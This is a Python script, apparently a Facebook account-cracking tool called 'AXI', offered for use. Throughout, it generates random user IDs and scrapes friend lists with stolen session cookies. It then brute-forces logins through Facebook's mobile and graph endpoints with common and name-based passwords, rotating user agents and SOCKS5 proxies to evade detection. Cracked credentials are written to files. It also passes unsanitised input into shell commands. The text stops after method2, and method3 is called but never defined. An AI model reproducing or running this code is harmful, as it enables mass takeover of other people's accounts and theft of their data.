#coding=utf-8
import os,sys,time,json,random,re,string,platform,base64,uuid
from rich import pretty 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool 
except ModuleNotFoundError:
    os.system('pip install --upgrade pip && pip install requests futures==2 > /dev/null')
    os.system('python axi.py')
logo="""<>××<>××<>××<>××<>××<>××<>××<>××<>××
\033[1;97m<>××           ###    ##     ## #### <>××
\033[1;97m<>××          ## ##    ##   ##   ##  <>××
\033[1;97m<>××         ##   ##    ## ##    ##  <>××
\033[1;97m<>××        ##     ##    ###     ##  <>××
\033[1;97m<>××        #########   ## ##    ##  <>××
\033[1;97m<>××        ##     ##  ##   ##   ##  <>××
\033[1;97m<>××        ##     ## ##     ## #### <>××
<>××---------------------------------------<>××
<>×× Owner    : <>×× MALIK AHMAD AWAN <>××
<>×× Team     : <>×× AR <>××
<>×× TOOL     : <>×× FACEBOOK CLONING <>××
<>×× Version  : <>×× 6.2 <>××
<>××--------------------------------------<>××
<>××Turn on & off flight mode before use<>××
<>××------------------------------------------<>××"""
loop = 0
ok = []
cp = []
tf = []
ua_android = []
ua_opera = []
#split_function

#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mMALIKZADA✓✓✓')
prox=open('.prox.txt','r').read().splitlines()
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

def exit():
    os.sys.exit()
def show(text):
    print(text)
    print(50*'-')
def login():
    os.system('clear')
    print(logo)
    #print('\n\033[1;97m If you donot know how to get cookies, see option in main menu\033[0;97m')
    cookies = input('\n Put cookies here: ')
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
        find_token = re.search("(EAAG\w+)", data.text)
        open("access_token.txt", "w").write(find_token.group(1))
        open("fb_cookies.txt","w").write(cookies)
        print(' Logged in successfully ...')
        time.sleep(1)
        os.system('python hst.py')
    except KeyError:
        print('\n Inavlid cookies, try another cookies')
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
    except AttributeError:
        print('\n Invalid cookies, try another cookies ...')
        exit()
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print('\n\033[0;97m  File not found on provided path, try again ...\033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;97m Example: /sdcard/filename.txt\033[0;97m')
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    main()
def remove_dub():
    os.system('clear')
    print(logo)
    print(' Dublicate lines remover ...')
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print('\n\033[1;97m Example: /sdcard/filename.txt\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: '+save_file)
        print(50*'-')
        input('\n Press enter to back ')
        main()
    except FileNotFoundError:
        print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
def main():
    os.system('clear && rm -rf .txt .t.txt')
    print(logo)
    print('[1]<>×× RANDOM CRACK')
    print('[2]<>×× FILE CRACK')
    print('[3]<>×× FILE MAKER')
    print('[4]<>×× RANDOM FILE MAKER')
    print('[5]<>×× IDZ SEPRATE FILE')
    print('[6]<>×× REMOVE DUBLICATE FILE')
    print('[7]<>×× LOGOUT ACCOUNT')
    print(50*'-')
    opt = input(' Choose option :  ')
    if opt =='1':
        random_crack()
    elif opt =='2':
        file_crack()
    elif opt =='3':
        create_file_login()
    elif opt =='4':
        create_file_nologin()
    elif opt =='5':
        sids()
    elif opt =='6':
        os.system('rm -rf fb_cookies.txt')
        login()
    elif opt =='7':
        remove_dub()
    else:
        print('\n Choose valid option ... ')
def random_crack():
    global ok,cp,tf
    os.system('clear')
    print(logo)
    print(' [1]<>×× RANDOM OLD')
    print(' [2]<>×× RANDOM UID 7 DIGIT')
    print(' [3]<>×× RANDOM UID KHAN SERIES')
    print(' [4]<>×× RANDOM UID ALI SERIES')
    print(' [5]<>×× RANDOM MAIL')
    print(' [6]<>×× RANDOM UID 7 DIGIT AND KHAN SERIES')
    print(' [B]<>×× Back')
    print(50*'-')
    opt = input(' Choose option >>> ')
    if opt =='1':
        os.system('clear && rm -rf .rl.txt')
        print(logo)
        links = ['1000','10000']
        print(' Getting links, wait here ...')
        for xd in range(4999):
            lchoice = random.choice(links)
            if str(len(lchoice)) =='4':
                idss = ''.join(random.choice(string.digits) for _ in range(11))
                open('.rl.txt', 'a').write(lchoice+idss+'\n')
            else:
                idss = ''.join(random.choice(string.digits) for _ in range(10))
                open('.rl.txt','a').write(lchoice+idss+'\n')
        fo = open('.rl.txt','r').read().splitlines()
        with ThreadPool(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)

            print(50*'-')
            for user in fo:
                ids = user
                passlist = ['123456','1234567','12345678','123456789']
                crack_submit.submit(random_method,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
        os.system('clear && rm -rf .rn.txt')
        print(logo)
        print('\033[1;97m PUT CODE: 0301,0302,0303,0305  \033[0;97m')
        code = input('\n Put code: ')
        os.system('clear')
        print(logo)
        for xd in range(10000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with ThreadPool(max_workers=65) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)

            print(50*'-')
            for user in fo:
                ids,ps = user.split('|')
                passlist = [ps]
                crack_submit.submit(random_method,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='3':
        os.system('clear && rm -rf .rn.txt')
        print(logo)
        print('\033[1;97m PUT CODE: 0301,0302,0303,0305  \033[0;97m')
        code = input('\n Put code: ')
        os.system('clear')
        print(logo)
        for xd in range(10000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with ThreadPool(max_workers=65) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)

            print(50*'-')
            for user in fo:
                ids,ps = user.split('|')
                passlist = ['khan1122','khankhan','khan12','khan786','khan123']
                crack_submit.submit(random_method,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='4':
        os.system('clear && rm -rf .rn.txt')
        print(logo)
        print('\033[1;97m PUT CODE: 0301,0302,0303,0305  \033[0;97m')
        code = input('\n Put code: ')
        os.system('clear')
        print(logo)
        for xd in range(10000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with ThreadPool(max_workers=65) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)

            print(50*'-')
            for user in fo:
                ids,ps = user.split('|')
                passlist = ['ali123','ali786','ali1234','ali1122']
                crack_submit.submit(random_method,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='6':
        os.system('rm -rf .rn.txt')
        print(logo)
        print('\033[1;97m PUT CODE: 0301,0302,0303,0305  \033[0;97m')
        code = input('\n Put code: ')
        os.system('clear')
        print(logo)
        for xd in range(10000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with ThreadPool(max_workers=65) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)

            print(50*'-')
            for user in fo:
                ids,ps = user.split('|')
                passlist = [ps,'khan1122','khan12','khankhan']
                crack_submit.submit(random_method,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='5':
        os.system('clear && rm -rf .re.txt')
        print(logo)
        print('\033[1;97m first name example: muhammad, noman, tazeem, faizan\033[0;97m')
        first = input('\n Put first name: ')
        print('\n\033[1;97m last name example: hamza, khan, sajjad, rafiq \033[0;97m')
        last = input('\n Put last name: ')
        print('\n\033[1;97m domain example: @gmail.com, @yahoo.com, @yandex.com\033[0;97m')
        domain = input('\n Put domain: ')
        os.system('clear')
        print(logo)
        lists = ['3','4']
        for xd in range(5999):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
        xd_ps=input('  Do you want additional passwords (y/n) ? ')
        fo = open('.re.txt', 'r').read().splitlines()
        with ThreadPool(max_workers=65) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)

            print(50*'-')
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'Khan'
                fs = first_name.lower()
                ls = last_name.lower()
                if xd_ps =='n':
                    passlist = [fs+ls,fs+' '+ls]
                    crack_submit.submit(random_method,ids,passlist,total_ids)
                else:
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(random_method,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='B':
        main()
    else:
        print(' Choose valid option ... ')
        time.sleep(1)
        main()
def create_file_nologin():
    os.system('clear')
    print(logo)
    print('\033[1;97m Example: 5000,500,300,700,900 ...\033[0;97m')
    limit = int(input(' How many ids do you want to add ? '))
    print('\n\033[1;97m Example: /sdcard/filename.txt\033[0;97m')
    sf = input(' Save file in: ')
    print(50*'-')
    tc = 0
    while tc < limit:
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        uid = '1000'+nmp
        ng = requests.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr').text
        try:
            coll = re.search('class="t m" alt="(.*?)"',str(ng)).group(1)
            spl = coll.split(',')[0]
            open(sf,'a').write(uid+'|'+spl+'\n')
            tc +=1
            sys.stdout.write('\r Successfully added %s ids...\r'%(tc)),sys.stdout.flush()
        except Exception as e:
            pass
    print(' File created successfully')
    input('\n Press enter to back ')
    main()
def create_file_login():
    try:
        fb = open('fb_cookies.txt', 'r').read()
        fb_token = str(open('access_token.txt', 'r').read())
        fb_cookies = {'cookie':str(fb)}
    except FileNotFoundError:
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ....')
        exit()
    try:
        graph_url = 'https://graph.facebook.com/me?fields=id,name&access_token=%s'%(fb_token)
        xyz = requests.Session()
        r = xyz.get(graph_url,cookies=fb_cookies).text
        data = json.loads(r)
        iid = data['id']
        name = data['name']
    except requests.exceptions.ConnectionError:
        print('  No internet connection ... ')
        exit()
    except KeyError:
        print(' Logged in account has checkpoint, try another account ...')
        os.system('rm -rf fb_cookies.txt access_token.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print(logo)
    print(' Login id: '+iid)
    print(' Login name: '+name)
    print(50*'-')
    print(' [1]<>×× CREATE FROM PUBLIC LIST')
    print(' [2]<>×× CREATE FALLOWER LIST')
    print(' [B]<>×× Back')
    print(50*'-')
    opt = input(' Choose option >>> ')
    if opt =='1':
        print('\n\n [1]<>×× AUTO SYSTEM')
        print(' [2]<>×× MANUAL SYSTEM')
        print(50*'-')
        opt2 = input(' Choose option >>> ')
        if opt2 =='1':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            #params
            print('\n\033[1;97m Example: /sdcard/filename.txt\033[0;97m')
            fsi = input(' Save file as: ')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            yar = []
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                idt = str(input(' Put id no %s: '%t))
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['friends']['data']:
                    uid = i['id']
                    if uid in yar:
                        pass
                    else:
                        open('.txt', 'a').write(uid+'\n')
                        yar.append(uid)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(yar)))
            print(50*'-')
            try:
                li2 = int(input(' How many ids do you want to extract ? '))
            except:
                li2 = 1
            print('\n\033[1;97m Link example: 100080,100081,100082,100014,100045 etc \033[0;97m')
            t=0
            for f in range(li2):
                t+=1
                sid = input(' %s link start with: '%t)
                os.system('cat .txt | grep "'+sid+'" > .t.txt')
            file_open = open('.t.txt', 'r').read().splitlines()
            #tc.append(file_open)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(file_open)))

            print(50*'-')
            for iidss in file_open:
                try:
                    relax = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(iidss,fb_token)
                    yaad = xyz.get(relax,cookies=fb_cookies).text
                    rd = json.loads(yaad)
                    for fq in rd['friends']['data']:
                        idss = fq['id']
                        fnames = fq['name']
                        open(fs,'a').write(idss+'|'+fnames+'\n')
                        sys.stdout.write('\r\033[1;32m  Ex ids from:  %s ...\033[0;97m\r'%(iidss)),sys.stdout.flush()
                except KeyError:
                    if 'enrolled' in rd:
                        sys.stdout.write('\r\033[1;31m  Cookies expired, not ex from: %s \033[0;97m\r'%(iidss)),sys.stdout.flush()
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        sys.stdout.write('\r\033[1;97m  No friends for: %s ...\033[0;97m\r'%(iidss)),sys.stdout.flush()
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    pass
            print(50*'-')
            print(' The process has completed')
            print(' Total ids extracted: '+str(len(open(fs,'r').read().splitlines())))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        elif opt2 =='2':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            print('\n\033[1;97mExample: /sdcard/filename.txt\033[0;97m')
            fsi = input(' Save file as: ')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                try:
                    idt = input(' Put id no %s: '%t)
                    fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                    xyz = requests.Session()
                    fd = xyz.get(fd_url,cookies=fb_cookies).text
                    fl = json.loads(fd)
                    for i in fl['friends']['data']:
                        uid = i['id']
                        fnames = i['name']
                        open(fs,'a').write(uid+'|'+fnames+'\n')
                        tc.append(uid)
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    pass
                except KeyError:
                    if 'enrolled' in fl:
                        print('  Logged in id got checkpoint, try another account ...')
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        print(' No friendlist found ...')
                        pass
            print(50*'-')
            print(' Total ids: '+str(len(tc)))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        else:
            print(' Choose valid option ...')
            time.sleep(1)
            create_file_login()
    elif opt =='2':
        os.system('clear')
        print(logo)
        try:
            li = int(input(' How many ids do you want to add ? '))
        except:
            li = 1
        print('\n\033[1;97mExample: /sdcard/filename.txt\033[0;97m')
        fsi = input(' Save file as: ')
        if '/sdcard/' in fsi:
            fs = fsi
        else:
            fs = '/sdcard/'+fsi
        tc = []
        t = 0
        for _ in range(li):
            t +=1
            try:
                idt = input(' Put id no %s: '%t)
                fd_url = 'https://graph.facebook.com/%s?fields=subscribers.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['subscribers']['data']:
                    uid = i['id']
                    fnames = i['name']
                    open(fs,'a').write(uid+'|'+fnames+'\n')
                    tc.append(uid)
            except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
                break
            except KeyError:
                if 'enrolled' in fl:
                    print('  Logged in id got checkpoint, try another account ...')
                    os.system('rm -rf fb_cookies.txt access_token.txt')
                    exit()
                else:
                    print(' No friendlist found ...')
                    break
        print(50*'-')
        print(' Total ids: '+str(len(tc)))
        print(' File saved as: '+fs)
        input('\n Press enter to back ')
        main()
def file_crack():
    global ok,cp,tf
    os.system('clear')
    print(logo)
    print(' [1]<>×× METHOD 1')
    print(' [2]<>×× METHOD 2')
    print(' [3]<>×× METHOD 3')
    print(50*'-')
    opt_method = input(' Choose method: ')
    os.system('clear')
    print(logo)
    show(' Use flight mode before using starting crack')
    file = input(' Put file path: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
        ps_limit = int(input(' How many passwords do you want to add ? '))
    except:
        ps_limit =1
    print(' ')
    for i in range(ps_limit):
        plist.append(input(f' Put password {i+1}: '))
    with ThreadPool(max_workers=30) as crack_submit:
        os.system('clear')
        print(logo)
      #  show(' Use flight mode before using starting crack')
        total_ids = str(len(fo))
        print(' Total ids: '+total_ids)
        print("\033[1;37m \x1b[38;5;208mUse Flight Mode For Speed UP\033[1;37m")
        print(50*'-')
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if opt_method =='1':
                crack_submit.submit(method1,ids,names,passlist,total_ids)
            elif opt_method =='2':
                crack_submit.submit(method2,ids,names,passlist,total_ids)
            else:
                crack_submit.submit(method3,ids,names,passlist,total_ids)
    print(50*'-')
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
    input('\n Press enter to back ')
    main()
def method1(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32m m1','\033[1;31m m1']
    rr = random.choice(rcol)
    whi = '\033[1;97m'
    sys.stdout.write('\r\r%s[MHR] %s|%s  OK:- %s'%(whi,loop,total_ids,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            ua = random.choice(ua_opera)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            hed1 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','cache-control': 'max-age=0','referer': f'https://mbasic.facebook.com/login/device-based/password/?uid='+ids+'&errorcode=1348092&next=https%3A%2F%2Fmbasic.facebook.com%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
            req1 = r.get(url1,headers=hed1)
            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : ids,'pass' : pas,'next' : f'https://mbasic.facebook.com/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
            url2 = f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0'
            hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-length': '159','content-type': 'application/x-www-form-urlencoded','origin': f'https://mbasic.facebook.com','referer': f'https://mbasic.facebook.com/login/device-based/password/?uid='+ids+'&errorcode=1348092&next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
            cookies = r.cookies.get_dict().keys()
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[MHR-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[MHR-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[MHR-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass
def method2(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32m m2','\033[1;31m m2']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write('\r %s   %s[%s/%s]  OK:- %s  CP:- %s  2F:- %s\r'%(rr,whi,loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            nip=random.choice(prox)
            r = requests.Session()
            proxs= {'http': 'socks5://'+nip}
            data={"adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email":ids,
            "password":pas,
            "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
            "generate_session_cookies":"1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            post = r.post("https://graph.facebook.com/auth/login",data=data,proxies=proxs)
            q = json.loads(post.text)
            if 'access_token' in q:
                print('\033[1;32m [AXI-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m [AXI-2F] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m [AXI-CP] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
